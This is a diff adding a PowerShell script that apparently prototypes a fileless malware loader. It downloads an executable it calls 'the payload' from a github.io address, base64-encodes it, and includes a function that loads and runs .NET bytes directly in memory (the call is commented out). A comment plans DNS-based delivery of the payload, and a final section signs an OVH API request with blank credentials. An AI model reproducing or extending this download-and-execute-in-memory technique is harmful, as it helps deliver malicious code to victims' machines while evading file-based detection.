@@ -1,0 +1,55 @@
+function RunAssembly{
+    param (
+        [Byte[]]$bytes
+    )
+
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    $entryPoint = $assembly.EntryPoint
+    $entryPoint.Invoke($null, $null)
+}
+
+
+
+# Récupération du payload
+$url = "https://hakkyahud.github.io/HelloWorldCS.exe"
+$bytes = (New-Object Net.WebClient).DownloadData($url)
+
+# Convert to base64
+$base64 = [System.Convert]::ToBase64String($bytes)
+$bytes2 = [System.Convert]::FromBase64String($base64)
+
+# RunAssembly($bytes2)
+
+# Send base64 payload to DNS server
+
+# OVH cred API
+$endpoint=""
+$AK = ""
+$AS = ""
+$CK = ""
+
+# Application GET : /me -> https://eu.api.ovh.com/1.0/me
+$QUERY = ""
+$METHOD = "GET"
+
+$BODY = ""
+$TIME = [DateTimeOffset]::Now.ToUnixTimeSeconds()
+# $TIME = "1679036847"
+Write-Output("Time : " + $TIME)
+$SHA = "$AS+$CK+$METHOD+$QUERY+$BODY+$TIME"
+Write-Output("Hash : " + $SHA)
+
+# Get Hash from String
+$stream = [System.IO.MemoryStream]::new()
+$writer = [System.IO.StreamWriter]::new($stream)
+$writer.Write($SHA)
+$writer.Flush()
+$stream.Position=0
+$hash = Get-FileHash -Algorithm SHA1 -InputStream $stream | foreach { $_.Hash }
+
+# $HASH = [System.Web.Security.FormsAuthentication]::HashPasswordForStoringInConfigFile($SHA, "SHA1")
+
+$SIGNATURE = '$1$'+$hash
+Write-Output("Signature : " + $SIGNATURE.ToLower())
+
+Invoke-WebRequest -Method GET -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE.ToLower(); "X-Ovh-Timestamp"=$TIME} https://eu.api.ovh.com/1.0/me
